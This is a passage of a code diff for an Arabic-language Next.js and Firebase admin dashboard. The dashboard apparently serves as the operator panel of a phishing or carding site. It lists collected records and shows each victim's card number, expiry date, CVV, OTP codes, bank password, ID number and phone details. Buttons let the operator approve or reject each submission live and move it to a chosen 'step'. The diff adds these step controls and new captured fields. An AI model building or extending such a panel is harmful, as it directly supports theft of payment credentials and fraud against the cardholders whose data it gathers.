         description: "حدث خطأ أثناء تحديث لون العلامة",
         variant: "destructive",
-      });
+      })
     }
-  };
+  }
+
+  const handleStepUpdate = async (id: string, step: number) => {
+    try {
+      const docRef = doc(db, "pays", id)
+      await updateDoc(docRef, { step: step })
+
+      setNotifications(
+        notifications.map((notification) => (notification.id === id ? { ...notification, step: step } : notification)),
+      )
+
+      toast({
+        title: "تم تحديث الخطوة",
+        description: `تم تحديث الخطوة بنجاح.`,
+        variant: "default",
+      })
+    } catch (error) {
+      console.error("Error updating step:", error)
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء تحديث الخطوة",
+        variant: "destructive",
+      })
+    }
+  }
 
   const handleApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id);
+      const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         status: state,
-      });
+      })
       toast({
         title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
-        description:
-          state === "approved"
-            ? "تمت الموافقة على الإشعار بنجاح"
-            : "تم رفض الإشعار بنجاح",
+        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
         variant: "default",
-      });
+      })
     } catch (error) {
-      console.error("Error updating notification status:", error);
+      console.error("Error updating notification status:", error)
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء تحديث حالة الإشعار",
         variant: "destructive",
-      });
+      })
     }
-  };
+  }
 
   const handleDelete = async (id: string) => {
     try {
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, { isHidden: true });
-      setNotifications(
-        notifications.filter((notification) => notification.id !== id)
-      );
+      const docRef = doc(db, "pays", id)
+      await updateDoc(docRef, { isHidden: true })
+      setNotifications(notifications.filter((notification) => notification.id !== id))
       toast({
         title: "تم مسح الإشعار",
         description: "تم مسح الإشعار بنجاح",
         variant: "default",
-      });
+      })
     } catch (error) {
-      console.error("Error hiding notification:", error);
+      console.error("Error hiding notification:", error)
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء مسح الإشعار",
         variant: "destructive",
-      });
+      })
     }
-  };
+  }
 
   const handleClearAll = async () => {
-    setIsLoading(true);
+    setIsLoading(true)
     try {
-      const batch = writeBatch(db);
+      const batch = writeBatch(db)
       notifications.forEach((notification) => {
-        const docRef = doc(db, "pays", notification.id);
-        batch.update(docRef, { isHidden: true });
-      });
-      await batch.commit();
-      setNotifications([]);
+        const docRef = doc(db, "pays", notification.id)
+        batch.update(docRef, { isHidden: true })
+      })
+      await batch.commit()
+      setNotifications([])
       toast({
         title: "تم مسح جميع الإشعارات",
         description: "تم مسح جميع الإشعارات بنجاح",
         variant: "default",
-      });
+      })
     } catch (error) {
-      console.error("Error hiding all notifications:", error);
+      console.error("Error hiding all notifications:", error)
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء مسح الإشعارات",
         variant: "destructive",
-      });
+      })
     } finally {
-      setIsLoading(false);
+      setIsLoading(false)
     }
-  };
+  }
 
   const handleLogout = async () => {
     try {
-      await signOut(auth);
-      router.push("/login");
+      await signOut(auth)
+      router.push("/login")
     } catch (error) {
-      console.error("Error signing out:", error);
+      console.error("Error signing out:", error)
       toast({
         title: "خطأ",
         description: "حدث خطأ أثناء تسجيل الخروج",
         variant: "destructive",
-      });
+      })
     }
-  };
+  }
 
   const handleSearch = (term: string) => {
-    setSearchTerm(term);
-  };
+    setSearchTerm(term)
+  }
 
   const handlePageChange = (page: number) => {
-    setCurrentPage(page);
-  };
+    setCurrentPage(page)
+  }
 
   const handleRefresh = () => {
-    setIsLoading(true);
-    fetchNotifications();
-  };
+    setIsLoading(true)
+    fetchNotifications()
+  }
 
   if (isLoading) {
     return (
@@ -1181,20 +1090,17 @@ export default function NotificationsPage() {
           <div className="text-lg font-medium">جاري التحميل...</div>
         </div>
       </div>
-    );
+    )
   }
 
   // Sample data for mini charts (you can replace with real trend data)
-  const visitorTrend = [5, 8, 12, 7, 10, 15, 13];
-  const cardTrend = [2, 3, 5, 4, 6, 8, 7];
-  const onlineTrend = [3, 4, 6, 5, 7, 8, 6];
-  const approvedTrend = [1, 2, 4, 3, 5, 7, 6];
+  const visitorTrend = [5, 8, 12, 7, 10, 15, 13]
+  const cardTrend = [2, 3, 5, 4, 6, 8, 7]
+  const onlineTrend = [3, 4, 6, 5, 7, 8, 6]
+  const approvedTrend = [1, 2, 4, 3, 5, 7, 6]
 
   return (
-    <div
-      dir="rtl"
-      className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20"
-    >
+    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
       {/* Mobile menu */}
       <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
         <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
@@ -1207,34 +1113,21 @@ export default function NotificationsPage() {
           <div className="space-y-6">
             <div className="flex items-center gap-4">
               <Avatar>
-                <AvatarImage
-                  src="/placeholder.svg?height=40&width=40"
-                  alt="صورة المستخدم"
-                />
+                <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                 <AvatarFallback>M</AvatarFallback>
               </Avatar>
               <div>
                 <p className="font-medium">مدير النظام</p>
-                <p className="text-sm text-muted-foreground">
-                  admin@example.com
-                </p>
+                <p className="text-sm text-muted-foreground">admin@example.com</p>
               </div>
             </div>
             <Separator />
             <nav className="space-y-2">
-              <Button
-                variant="ghost"
-                className="w-full justify-start"
-                onClick={() => setMobileMenuOpen(false)}
-              >
+              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
                 <Bell className="mr-2 h-4 w-4" />
                 الإشعارات
               </Button>
-              <Button
-                variant="ghost"
-                className="w-full justify-start"
-                onClick={() => setSettingsOpen(true)}
-              >
+              <Button variant="ghost" className="w-full justify-start" onClick={() => setSettingsOpen(true)}>
                 <Settings className="mr-2 h-4 w-4" />
                 الإعدادات
               </Button>
@@ -1242,18 +1135,14 @@ export default function NotificationsPage() {
                 variant="ghost"
                 className="w-full justify-start"
                 onClick={() => {
-                  setExportDialogOpen(true);
-                  setMobileMenuOpen(false);
+                  setExportDialogOpen(true)
+                  setMobileMenuOpen(false)
                 }}
               >
                 <Download className="mr-2 h-4 w-4" />
                 تصدير البيانات
               </Button>
-              <Button
-                variant="ghost"
-                className="w-full justify-start text-red-500"
-                onClick={handleLogout}
-              >
+              <Button variant="ghost" className="w-full justify-start text-red-500" onClick={handleLogout}>
                 <LogOut className="mr-2 h-4 w-4" />
                 تسجيل الخروج
               </Button>
@@ -1266,22 +1155,13 @@ export default function NotificationsPage() {
       <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />
 
       {/* Export dialog */}
-      <ExportDialog
-        open={exportDialogOpen}
-        onOpenChange={setExportDialogOpen}
-        notifications={filteredNotifications}
-      />
+      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />
 
       {/* Enhanced Header */}
       <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60">
         <div className="flex items-center justify-between p-4">
           <div className="flex items-center gap-4">
-            <Button
-              variant="ghost"
-              size="icon"
-              className="md:hidden"
-              onClick={() => setMobileMenuOpen(true)}
-            >
+            <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
               <Menu className="h-5 w-5" />
             </Button>
             <div className="flex items-center gap-3">
@@ -1307,6 +1187,23 @@ export default function NotificationsPage() {
           </div>
 
           <div className="flex items-center gap-2">
+          <TooltipProvider>
+              <Tooltip>
+                <TooltipTrigger asChild>
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    onClick={handleShowStatstics}
+                    className="relative overflow-hidden bg-transparent"
+                  >
+                  {showStatstics?<Eye/>:  <EyeClosed className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />}
+                  </Button>
+                </TooltipTrigger>
+                <TooltipContent>
+                  <p> اخفاءالبيانات</p>
+                </TooltipContent>
+              </Tooltip>
+            </TooltipProvider>
             <TooltipProvider>
               <Tooltip>
                 <TooltipTrigger asChild>
@@ -1314,11 +1211,9 @@ export default function NotificationsPage() {
                     variant="outline"
                     size="icon"
                     onClick={handleRefresh}
-                    className="relative overflow-hidden"
+                    className="relative overflow-hidden bg-transparent"
                   >
-                    <RefreshCw
-                      className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`}
-                    />
+                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                   </Button>
                 </TooltipTrigger>
                 <TooltipContent>
@@ -1331,11 +1226,7 @@ export default function NotificationsPage() {
               <TooltipProvider>
                 <Tooltip>
                   <TooltipTrigger asChild>
-                    <Button
-                      variant="outline"
-                      size="icon"
-                      onClick={() => setSettingsOpen(true)}
-                    >
+                    <Button variant="outline" size="icon" onClick={() => setSettingsOpen(true)}>
                       <Settings className="h-4 w-4" />
                       <span className="sr-only">الإعدادات</span>
                     </Button>
@@ -1349,11 +1240,7 @@ export default function NotificationsPage() {
               <TooltipProvider>
                 <Tooltip>
                   <TooltipTrigger asChild>
-                    <Button
-                      variant="outline"
-                      size="icon"
-                      onClick={() => setExportDialogOpen(true)}
-                    >
+                    <Button variant="outline" size="icon" onClick={() => setExportDialogOpen(true)}>
                       <Download className="h-4 w-4" />
                       <span className="sr-only">تصدير</span>
                     </Button>
@@ -1377,15 +1264,9 @@ export default function NotificationsPage() {
 
             <DropdownMenu>
               <DropdownMenuTrigger asChild>
-                <Button
-                  variant="ghost"
-                  className="relative h-10 w-10 rounded-full"
-                >
+                <Button variant="ghost" className="relative h-10 w-10 rounded-full">
                   <Avatar className="h-10 w-10 ring-2 ring-primary/20">
-                    <AvatarImage
-                      src="/placeholder.svg?height=40&width=40"
-                      alt="صورة المستخدم"
-                    />
+                    <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                     <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">
                       مد
                     </AvatarFallback>
@@ -1396,9 +1277,7 @@ export default function NotificationsPage() {
                 <DropdownMenuLabel>
                   <div className="flex flex-col space-y-1">
                     <p className="text-sm font-medium">مدير النظام</p>
-                    <p className="text-xs text-muted-foreground">
-                      admin@example.com
-                    </p>
+                    <p className="text-xs text-muted-foreground">admin@example.com</p>
                   </div>
                 </DropdownMenuLabel>
                 <DropdownMenuSeparator />
@@ -1411,10 +1290,7 @@ export default function NotificationsPage() {
                   تصدير البيانات
                 </DropdownMenuItem>
                 <DropdownMenuSeparator />
-                <DropdownMenuItem
-                  onClick={handleLogout}
-                  className="text-red-600"
-                >
+                <DropdownMenuItem onClick={handleLogout} className="text-red-600">
                   <LogOut className="ml-2 h-4 w-4" />
                   تسجيل الخروج
                 </DropdownMenuItem>
@@ -1426,7 +1302,7 @@ export default function NotificationsPage() {
 
       <div className="p-6">
         {/* Enhanced Statistics Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+        <div className={`grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8 ${showStatstics?"":"hidden"}`}>
           <StatisticsCard
             title="إجمالي الزوار"
             value={totalVisitorsCount}
@@ -1474,9 +1350,7 @@ export default function NotificationsPage() {
                   <Activity className="h-6 w-6 text-primary" />
                   إدارة الإشعارات
                 </CardTitle>
-                <CardDescription className="mt-1">
-                  عرض وإدارة جميع الإشعارات والبيانات المستلمة
-                </CardDescription>
+                <CardDescription className="mt-1">عرض وإدارة جميع الإشعارات والبيانات المستلمة</CardDescription>
               </div>
 
               <div className="flex flex-col sm:flex-row gap-3">
@@ -1484,41 +1358,29 @@ export default function NotificationsPage() {
                 <div className="flex gap-2">
                   <DropdownMenu>
                     <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2">
+                      <Button variant="outline" size="sm" className="gap-2 bg-transparent">
                         <Filter className="h-4 w-4" />
                         فلترة
                       </Button>
                     </DropdownMenuTrigger>
                     <DropdownMenuContent align="end">
-                      <DropdownMenuItem onClick={() => setFilterType("all")}>
-                        جميع الإشعارات
-                      </DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setFilterType("card")}>
-                        البطاقات فقط
-                      </DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setFilterType("online")}>
-                        المتصلين فقط
-                      </DropdownMenuItem>
+                      <DropdownMenuItem onClick={() => setFilterType("all")}>جميع الإشعارات</DropdownMenuItem>
+                      <DropdownMenuItem onClick={() => setFilterType("card")}>البطاقات فقط</DropdownMenuItem>
+                      <DropdownMenuItem onClick={() => setFilterType("online")}>المتصلين فقط</DropdownMenuItem>
                     </DropdownMenuContent>
                   </DropdownMenu>
 
                   <DropdownMenu>
                     <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2">
+                      <Button variant="outline" size="sm" className="gap-2 bg-transparent">
                         <ArrowUpDown className="h-4 w-4" />
                         ترتيب
                       </Button>
                     </DropdownMenuTrigger>
                     <DropdownMenuContent align="end">
-                      <DropdownMenuItem onClick={() => setSortBy("date")}>
-                        حسب التاريخ
-                      </DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setSortBy("status")}>
-                        حسب الحالة
-                      </DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setSortBy("country")}>
-                        حسب الدولة
-                      </DropdownMenuItem>
+                      <DropdownMenuItem onClick={() => setSortBy("date")}>حسب التاريخ</DropdownMenuItem>
+                      <DropdownMenuItem onClick={() => setSortBy("status")}>حسب الحالة</DropdownMenuItem>
+                      <DropdownMenuItem onClick={() => setSortBy("country")}>حسب الدولة</DropdownMenuItem>
                     </DropdownMenuContent>
                   </DropdownMenu>
                 </div>
@@ -1534,10 +1396,7 @@ export default function NotificationsPage() {
                 className="gap-2"
               >
                 الكل
-                <Badge
-                  variant="secondary"
-                  className="bg-background text-foreground"
-                >
+                <Badge variant="secondary" className="bg-background text-foreground">
                   {notifications.length}
                 </Badge>
               </Button>
@@ -1549,10 +1408,7 @@ export default function NotificationsPage() {
               >
                 <CreditCard className="h-4 w-4" />
                 البطاقات
-                <Badge
-                  variant="secondary"
-                  className="bg-background text-foreground"
-                >
+                <Badge variant="secondary" className="bg-background text-foreground">
                   {cardSubmissionsCount}
                 </Badge>
               </Button>
@@ -1564,10 +1420,7 @@ export default function NotificationsPage() {
               >
                 <UserCheck className="h-4 w-4" />
                 المتصلين
-                <Badge
-                  variant="secondary"
-                  className="bg-background text-foreground"
-                >
+                <Badge variant="secondary" className="bg-background text-foreground">
                   {onlineUsersCount}
                 </Badge>
               </Button>
@@ -1580,27 +1433,14 @@ export default function NotificationsPage() {
               <table className="w-full">
                 <thead>
                   <tr className="border-b bg-muted/30">
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
-                      الدولة
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
-                      المعلومات
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
-                      الحالة
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
-                      الوقت
-                    </th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
-                      الاتصال
-                    </th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
-                      الكود
-                    </th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
-                      الإجراءات
-                    </th>
+                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الدولة</th>
+                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">المعلومات</th>
+                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الحالة</th>
+                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الوقت</th>
+                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الاتصال</th>
+                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الكود</th>
+                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">تحديث الخطوة</th>
+                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الإجراءات</th>
                   </tr>
                 </thead>
                 <tbody>
@@ -1611,48 +1451,30 @@ export default function NotificationsPage() {
                           <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                             <MapPin className="h-4 w-4 text-primary" />
                           </div>
-                          <span className="font-medium">
-                            {notification.country || "غير معروف"}
-                          </span>
+                          <span className="font-medium">{notification.country || "غير معروف"}</span>
                         </div>
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex flex-wrap gap-2">
                           <Badge
-                            variant={
-                              notification.userName ? "default" : "secondary"
-                            }
+                            variant={notification.phone ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.userName
-                                ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
-                                : ""
+                              notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                             }`}
-                            onClick={() =>
-                              handleInfoClick(notification, "personal")
-                            }
+                            onClick={() => handleInfoClick(notification, "personal")}
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.userName
-                              ? "معلومات شخصية"
-                              : "لا يوجد معلومات"}
+                            {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
-                            variant={
-                              notification.cardNumber ? "default" : "secondary"
-                            }
+                            variant={notification.cardNumber ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.cardNumber
-                                ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
-                                : ""
+                              notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                             }`}
-                            onClick={() =>
-                              handleInfoClick(notification, "card")
-                            }
+                            onClick={() => handleInfoClick(notification, "card")}
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cardNumber
-                              ? "معلومات البطاقة"
-                              : "لا يوجد بطاقة"}
+                            {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                           </Badge>
                         </div>
                       </td>
@@ -1660,7 +1482,7 @@ export default function NotificationsPage() {
                         {notification.status === "approved" ? (
                           <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                             <CheckCircle className="h-3 w-3 mr-1" />
-                            موافق عليه
+                            موافق 
                           </Badge>
                         ) : notification.status === "rejected" ? (
                           <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
@@ -1670,7 +1492,7 @@ export default function NotificationsPage() {
                         ) : (
                           <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                             <Clock className="h-3 w-3 mr-1" />
-                            قيد المراجعة
+                           معلق
                           </Badge>
                         )}
                       </td>
@@ -1678,27 +1500,46 @@ export default function NotificationsPage() {
                         <div className="flex items-center gap-2 text-sm text-muted-foreground">
                           <Clock className="h-4 w-4" />
                           {notification.createdDate &&
-                            formatDistanceToNow(
-                              new Date(notification.createdDate),
-                              {
-                                addSuffix: true,
-                                locale: ar,
-                              }
-                            )}
+                            formatDistanceToNow(new Date(notification.createdDate), {
+                              addSuffix: true,
+                              locale: ar,
+                            })}
                         </div>
                       </td>
                       <td className="px-6 py-4 text-center">
-                        <UserStatus userName={notification.id} />
+                        <UserStatus userId={notification.id} />
                       </td>
                       <td className="px-6 py-4 text-center">
                         {notification.otp && (
-                          <Badge
-                            variant="outline"
-                            className="bg-blue-50 text-blue-700 border-blue-200"
-                          >
+                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200 ">
                             {notification.otp}
                           </Badge>
                         )}
+                      </td>
+                      <td className="px-6 py-4">
+                        <div className="flex flex-wrap justify-center gap-1">
+                          {stepButtons.map(({ name,label, step }) => (
+                             <TooltipProvider 
+                             key={step}
+                             >
+                             <Tooltip>
+                               <TooltipTrigger asChild>
+                            <Button
+                              size="icon"
+                              variant={notification.step === step ? "default" : "secondary"}
+                              onClick={() => handleStepUpdate(notification.id, step)}
+                              className={`text-xs px-2 h-7 ${notification.step === step?"bg-blue-500":"" }`}
+                            >
+                              {label}
+                            </Button>
+                            </TooltipTrigger>
+                              <TooltipContent>
+                                <p>{name}</p>
+                              </TooltipContent>
+                            </Tooltip>
+                          </TooltipProvider>
+                          ))}
+                        </div>
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex justify-center gap-1">
@@ -1708,12 +1549,11 @@ export default function NotificationsPage() {
                                 <Button
                                   variant="outline"
                                   size="sm"
-                                  onClick={() =>
-                                    handleApproval("approved", notification.id)
-                                  }
+                                  onClick={() => handleApproval("approved", notification.id)}
                                   className="bg-gradient-to-r from-green-500 to-green-600 text-white border-0 hover:from-green-600 hover:to-green-700"
                                   disabled={notification.status === "approved"}
                                 >
+                                <p>موافقة</p>
                                   <CheckCircle className="h-4 w-4" />
                                 </Button>
                               </TooltipTrigger>
@@ -1729,12 +1569,11 @@ export default function NotificationsPage() {
                                 <Button
                                   variant="outline"
                                   size="sm"
-                                  onClick={() =>
-                                    handleApproval("rejected", notification.id)
-                                  }
+                                  onClick={() => handleApproval("rejected", notification.id)}
                                   className="bg-gradient-to-r from-red-500 to-red-600 text-white border-0 hover:from-red-600 hover:to-red-700"
                                   disabled={notification.status === "rejected"}
                                 >
+                                <p>رفض</p>
                                   <XCircle className="h-4 w-4" />
                                 </Button>
                               </TooltipTrigger>
@@ -1761,7 +1600,9 @@ export default function NotificationsPage() {
                               </TooltipContent>
                             </Tooltip>
                           </TooltipProvider>
-                          <Badge>{notification?.currentPage}</Badge>
+                          <Badge>{notification?.amount||0.0}</Badge>
+                          <FlagColorSelector notificationId={notification.id} currentColor={notification?.flagColor} onColorChange={handleFlagColorChange}
+                          />
                         </div>
                       </td>
                     </tr>
@@ -1781,22 +1622,17 @@ export default function NotificationsPage() {
                           <MapPin className="h-5 w-5 text-primary" />
                         </div>
                         <div>
-                          <p className="font-semibold">
-                            {notification.country || "غير معروف"}
-                          </p>
+                          <p className="font-semibold">{notification.country || "غير معروف"}</p>
                           <p className="text-sm text-muted-foreground">
                             {notification.createdDate &&
-                              formatDistanceToNow(
-                                new Date(notification.createdDate),
-                                {
-                                  addSuffix: true,
-                                  locale: ar,
-                                }
-                              )}
+                              formatDistanceToNow(new Date(notification.createdDate), {
+                                addSuffix: true,
+                                locale: ar,
+                              })}
                           </p>
                         </div>
                       </div>
-                      <UserStatus userName={notification.id} />
+                      <UserStatus userId={notification.id} />
                     </div>
                   </CardHeader>
 
@@ -1804,44 +1640,46 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.userName ? "default" : "secondary"}
+                          variant={notification.phone ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.userName
-                              ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
-                              : ""
+                            notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                           }`}
-                          onClick={() =>
-                            handleInfoClick(notification, "personal")
-                          }
+                          onClick={() => handleInfoClick(notification, "personal")}
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.userName
-                            ? "معلومات شخصية"
-                            : "لا يوجد معلومات"}
+                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
-                          variant={
-                            notification.cardNumber ? "default" : "secondary"
-                          }
+                          variant={notification.cardNumber ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.cardNumber
-                              ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
-                              : ""
+                            notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.cardNumber
-                            ? "معلومات البطاقة"
-                            : "لا يوجد بطاقة"}
+                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
+                      </div>
+
+                      <div className="pt-3 border-t">
+                        <p className="text-sm font-medium text-muted-foreground mb-2">تحديث الخطوة:</p>
+                        <div className="flex flex-wrap gap-2">
+                          {stepButtons.map(({ label, step }) => (
+                            <Button
+                              key={step}
+                              size="sm"
+                              variant={notification.step === step ? "default" : "outline"}
+                              onClick={() => handleStepUpdate(notification.id, step)}
+                            >
+                              {label}
+                            </Button>
+                          ))}
+                        </div>
                       </div>
 
                       <div className="flex justify-between items-center">
                         <div className="flex items-center gap-2">
-                          <span className="text-sm text-muted-foreground">
-                            الحالة:
-                          </span>
+                          <span className="text-sm text-muted-foreground">الحالة:</span>
                           {notification.status === "approved" ? (
                             <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                               <CheckCircle className="h-3 w-3 mr-1" />
@@ -1860,10 +1698,7 @@ export default function NotificationsPage() {
                           )}
                         </div>
                         {notification.otp && (
-                          <Badge
-                            variant="outline"
-                            className="bg-blue-50 text-blue-700"
-                          >
+                          <Badge variant="outline" className="bg-blue-50 text-blue-700">
                             {notification.otp}
                           </Badge>
                         )}
@@ -1871,9 +1706,7 @@ export default function NotificationsPage() {
 
                       <div className="flex gap-2 pt-2 border-t">
                         <Button
-                          onClick={() =>
-                            handleApproval("approved", notification.id)
-                          }
+                          onClick={() => handleApproval("approved", notification.id)}
                           className="flex-1 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
                           size="sm"
                           disabled={notification.status === "approved"}
@@ -1882,9 +1715,7 @@ export default function NotificationsPage() {
                           موافقة
                         </Button>
                         <Button
-                          onClick={() =>
-                            handleApproval("rejected", notification.id)
-                          }
+                          onClick={() => handleApproval("rejected", notification.id)}
                           className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700"
                           size="sm"
                           disabled={notification.status === "rejected"}
@@ -1901,7 +1732,7 @@ export default function NotificationsPage() {
                           <Trash2 className="h-4 w-4" />
                         </Button>
 
-                        <Badge>{notification?.currentPage}</Badge>
+                        <Badge>{notification?.amount}</Badge>
                       </div>
                     </div>
                   </CardContent>
@@ -1916,9 +1747,7 @@ export default function NotificationsPage() {
                   <Bell className="h-8 w-8 text-muted-foreground" />
                 </div>
                 <h3 className="text-lg font-semibold mb-2">لا توجد إشعارات</h3>
-                <p className="text-muted-foreground">
-                  لا توجد إشعارات متطابقة مع الفلتر المحدد
-                </p>
+                <p className="text-muted-foreground">لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
               </div>
             )}
           </CardContent>
@@ -1968,11 +1797,13 @@ export default function NotificationsPage() {
                   { label: "الاسم", value: selectedNotification.name },
                   { label: "رقم الهوية", value: selectedNotification.idNumber },
                   {
-                    label: "البريد الإلكتروني",
-                    value: selectedNotification.email,
+                    label: "الشبكة ",
+                    value: selectedNotification.network,
                   },
                   { label: "رقم الجوال", value: selectedNotification.mobile },
-                  { label: "الهاتف", value: selectedNotification.userName },
+                  { label: "الهاتف", value: selectedNotification.phone },
+                  { label: "رمزهاتف", value: selectedNotification.otp2 },
+
                 ].map(
                   ({ label, value }) =>
                     value && (
@@ -1980,12 +1811,10 @@ export default function NotificationsPage() {
                         key={label}
                         className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                       >
-                        <span className="font-medium text-muted-foreground">
-                          {label}:
-                        </span>
+                        <span className="font-medium text-muted-foreground">{label}:</span>
                         <span className="font-semibold">{value}</span>
                       </div>
-                    )
+                    ),
                 )}
               </div>
             </div>
@@ -1995,49 +1824,42 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-               { label: "البنك", value: selectedNotification.bank },
+                  { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber,
+                    value: `${selectedNotification?.cardNumber} - ${selectedNotification?.prefix}`,
                   },
                   {
                     label: "تاريخ الانتهاء",
                     value:
                       selectedNotification.year && selectedNotification.month
                         ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiaryDate,
+                        : selectedNotification.expiryDate,
                   },
                   { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
                   { label: "كلمة المرور", value: selectedNotification.pass },
+                  { label: "الخطوة الحالية", value: selectedNotification.step },
                 ].map(
                   ({ label, value }) =>
-                    value && (
+                    value !== undefined && (
                       <div
                         key={label}
                         className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                       >
-                        <span className="font-medium text-muted-foreground">
-                          {label}:
-                        </span>
-                        <span className="font-semibold" dir="ltr">{value}</span>
+                        <span className="font-medium text-muted-foreground">{label}:</span>
+                        <span className="font-semibold" >{String(value)}</span>
                       </div>
-                    )
+                    ),
                 )}
                 {selectedNotification.allOtps &&
                   Array.isArray(selectedNotification.allOtps) &&
                   selectedNotification.allOtps.length > 0 && (
                     <div className="pt-2 border-t border-border/30">
-                      <span className="font-medium text-muted-foreground block mb-2">
-                        جميع الرموز:
-                      </span>
+                      <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                       <div className="flex flex-wrap gap-2">
                         {selectedNotification.allOtps.map((otp, index) => (
-                          <Badge
-                            key={index}
-                            variant="outline"
-                            className="bg-muted"
-                          >
+                          <Badge key={index} variant="outline" className="bg-muted">
                             {otp}
                           </Badge>
                         ))}
@@ -2050,5 +1872,5 @@ export default function NotificationsPage() {
         </DialogContent>
       </Dialog>
     </div>
-  );
+  )
 }
